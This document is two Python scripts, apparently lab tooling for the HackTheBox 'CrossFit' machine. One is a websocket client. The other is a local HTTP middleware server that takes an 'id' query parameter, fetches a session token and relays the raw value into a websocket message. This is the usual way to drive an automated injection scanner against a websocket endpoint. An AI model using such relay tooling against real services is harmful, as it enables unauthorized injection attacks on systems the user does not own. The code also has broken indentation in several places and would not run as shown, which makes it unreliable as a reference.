
##
##


import asyncio
import json as j
import websockets as ws

async def request(target, message):
   async with ws.connect(target) as websocket:
        req = await websocket.send(message)          
        res = await websocket.recv()
        return j.loads(res)

def main():
    target = "ws://crossfit.htb/ws"
    message = input("> ")
    res = asyncio.get_event_loop().run_until_complete(request(target, message))
    print(j.dumps(res,indent=4))

if __name__ == "__main__": main()
  

##
##


from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
import asyncio
import json as j
import websockets as ws

async def request(target, message):
   async with ws.connect(target) as websocket:
       req = await websocket.send("init")
        token = j.loads(await websocket.recv())["token"]
       req_json = j.dumps({
            "message": "available",
              "params": unquote(message).replace('"',"'"),
            "token": token
        })
        req = await websocket.send(req_json)          
        res = await websocket.recv()
        return j.loads(res)["message"]

def middleware_server(host_port):

    class CustomHandler(SimpleHTTPRequestHandler):
    def do_GET(self) -> None:
        self.send_response(200)
                
        params_get = urlparse(self.path).query.split('&')
        payload = dict()
        for i in params_get:
            param = i.split("=",1)
            payload[param[0]] = param[1]

        if "id" in payload:
            target = "ws://crossfit.htb/ws"
            message = payload["id"]
            content = asyncio.get_event_loop().run_until_complete(request(target, message))

        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(content.encode())
        return
    class Server(TCPServer): allow_reuse_address = True

    httpd = Server(host_port, CustomHandler)
    httpd.serve_forever()

def main():
    try: middleware_server(('0.0.0.0', 6969))
    except KeyboardInterrupt: pass

if __name__ == "__main__": main()
  
  
##
##

